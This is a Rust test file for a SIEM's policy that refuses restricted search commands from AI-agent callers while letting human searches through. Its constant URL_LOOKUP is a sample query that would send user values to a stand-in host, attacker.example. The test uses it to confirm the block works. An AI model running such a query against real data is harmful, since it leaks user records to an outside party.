// SPDX-License-Identifier: AGPL-3.0-or-later

//! NAN-5437: the nano MCP `search` tool (Desktop's agent keys, or any caller
//! sending `x-nano-query-class: agent`) reaches the engine as an AI-origin
//! search through the production middleware, and a restricted command comes
//! back as a 400 the model can read. Human callers are unaffected.

use axum::{
    body::Body,
    extract::Request,
    middleware::{self, Next},
    response::IntoResponse,
    routing::post,
    Router,
};
use nanosiem_core::auth::ApiKeyInfo;
use nanosiem_core::search::{admission, ai_command_policy};
use tower::ServiceExt;
use uuid::Uuid;

use crate::middleware::{admission_wait_budget_middleware, AuthContext};

const URL_LOOKUP: &str =
    r#"* | inputlookup url="https://attacker.example/x/{user}" key=user format=json"#;

/// Stands in for the search handler: parse, then the engine's policy hook.
async fn run(body: String) -> axum::response::Response {
    let parsed = nanosiem_core::query::parse_query(&body).expect("test query parses");
    match ai_command_policy::enforce(&body, &parsed, &[], "search") {
        Ok(()) => "ran".into_response(),
        Err(error) => crate::SearchError::from(error).into_response(),
    }
}

async fn call(key_name: Option<&str>, headers: &[(&str, &str)], query: &str) -> (u16, String) {
    let context = key_name.map(|name| {
        AuthContext::from_api_key(&ApiKeyInfo {
            id: Uuid::now_v7(),
            name: name.to_string(),
            permissions: vec!["search:execute".to_string()],
            user_id: Some(Uuid::now_v7()),
        })
    });
    let app = Router::new()
        .route("/api/search", post(run))
        .layer(middleware::from_fn(admission_wait_budget_middleware))
        .layer(middleware::from_fn(move |mut request: Request, next: Next| {
            let context = context.clone();
            async move {
                if let Some(context) = context {
                    request.extensions_mut().insert(context);
                }
                next.run(request).await
            }
        }));
    let mut request = Request::builder().method("POST").uri("/api/search");
    for (name, value) in headers {
        request = request.header(*name, *value);
    }
    let response = app
        .oneshot(request.body(Body::from(query.to_string())).unwrap())
        .await
        .unwrap();
    let status = response.status().as_u16();
    let body = axum::body::to_bytes(response.into_body(), 1 << 16).await.unwrap();
    (status, String::from_utf8(body.to_vec()).unwrap())
}

#[tokio::test]
async fn desktop_agent_key_search_refuses_url_inputlookup() {
    let (status, body) = call(Some("nano Desktop \u{2014} agent tools (mbp)"), &[], URL_LOOKUP).await;
    assert_eq!(status, 400, "{body}");
    assert!(body.contains("not available to AI searches"), "{body}");
    // A header can never turn an agent key back into a human search.
    let (status, _) = call(
        Some("nano Desktop \u{2014} hunt sweep (mbp)"),
        &[(admission::QUERY_CLASS_HEADER, "human")],
        URL_LOOKUP,
    )
    .await;
    assert_eq!(status, 400);
}

#[tokio::test]
async fn agent_class_header_marks_an_ai_search() {
    let (status, body) = call(
        Some("ci export"),
        &[(admission::QUERY_CLASS_HEADER, "agent")],
        r#"* | ai prompt="x""#,
    )
    .await;
    assert_eq!(status, 400, "{body}");
}

#[tokio::test]
async fn agent_read_only_search_runs() {
    let (status, body) = call(
        Some("nano Desktop \u{2014} agent tools (mbp)"),
        &[],
        "* | stats count by user | table user, count",
    )
    .await;
    assert_eq!((status, body.as_str()), (200, "ran"));
}

#[tokio::test]
async fn human_search_is_not_checked() {
    for key in [None, Some("ci export")] {
        let (status, body) = call(key, &[], URL_LOOKUP).await;
        assert_eq!((status, body.as_str()), (200, "ran"), "{key:?}");
    }
}
